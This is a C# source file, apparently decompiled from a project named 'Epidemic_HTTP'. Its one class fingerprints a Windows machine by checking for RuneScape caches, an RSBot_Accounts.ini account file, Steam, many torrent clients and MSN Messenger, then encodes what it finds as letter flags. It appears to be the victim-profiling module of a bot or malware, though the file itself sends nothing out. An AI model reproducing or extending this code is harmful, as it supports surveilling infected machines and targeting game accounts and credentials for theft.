using System;
using System.IO;

namespace Epidemic_HTTP;

internal class Flags
{
	public static string mainDrive = Path.GetPathRoot(Environment.SystemDirectory);

	public static string homeDir = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");

	public string getFlags()
	{
		try
		{
			return getRunescape() + getRSBot() + getSteam() + getTorrent() + getMSN();
		}
		catch (Exception ex)
		{
			Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	private string getRunescape()
	{
		string result = "";
		string[] array = new string[4]
		{
			homeDir + "\\.jagex_cache_32",
			homeDir + "\\jagex_runescape_preferences.dat",
			Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + ".jagex_cache_32",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\RSBot_Accounts.ini"
		};
		for (int i = 0; i < array.Length; i++)
		{
			if (Directory.Exists(array[i]) || File.Exists(array[i]))
			{
				result = "R";
				break;
			}
		}
		return result;
	}

	private string getRSBot()
	{
		string result = "";
		string[] array = new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\RSBot_Accounts.ini" };
		for (int i = 0; i < array.Length; i++)
		{
			if (Directory.Exists(array[i]) || File.Exists(array[i]))
			{
				result = "B";
				break;
			}
		}
		return result;
	}

	private string getSteam()
	{
		string result = "";
		string[] array = new string[2]
		{
			mainDrive + "Program Files (x86)\\Steam",
			mainDrive + "Program Files\\Steam"
		};
		for (int i = 0; i < array.Length; i++)
		{
			if (Directory.Exists(array[i]) || File.Exists(array[i]))
			{
				result = "S";
				break;
			}
		}
		return result;
	}

	private string getTorrent()
	{
		string result = "";
		string[] array = new string[14]
		{
			mainDrive + "Program Files\\BitTorrent",
			mainDrive + "Program Files (x86)\\BitTorrent",
			mainDrive + "Program Files\\uTorrent",
			mainDrive + "Program Files (x86)\\uTorrent",
			mainDrive + "Program Files\\tixati",
			mainDrive + "Program Files (x86)\\tixati",
			mainDrive + "Program Files\\Bitcomet",
			mainDrive + "Program Files (x86)\\Bitcomet",
			mainDrive + "Program Files\\ABC",
			mainDrive + "Program Files (x86)\\ABC",
			mainDrive + "Program Files\\Deluge",
			mainDrive + "Program Files (x86)\\Deluge",
			mainDrive + "Program Files\\Vuze",
			mainDrive + "Program Files (x86)\\Vuze"
		};
		for (int i = 0; i < array.Length; i++)
		{
			if (Directory.Exists(array[i]) || File.Exists(array[i]))
			{
				result = "T";
				break;
			}
		}
		return result;
	}

	private string getMSN()
	{
		string result = "";
		string[] array = new string[2]
		{
			mainDrive + "Program Files (x86)\\Windows Live\\Messenger",
			mainDrive + "Program Files\\Windows Live\\Messenger"
		};
		for (int i = 0; i < array.Length; i++)
		{
			if (Directory.Exists(array[i]) || File.Exists(array[i]))
			{
				result = "M";
				break;
			}
		}
		return result;
	}
}
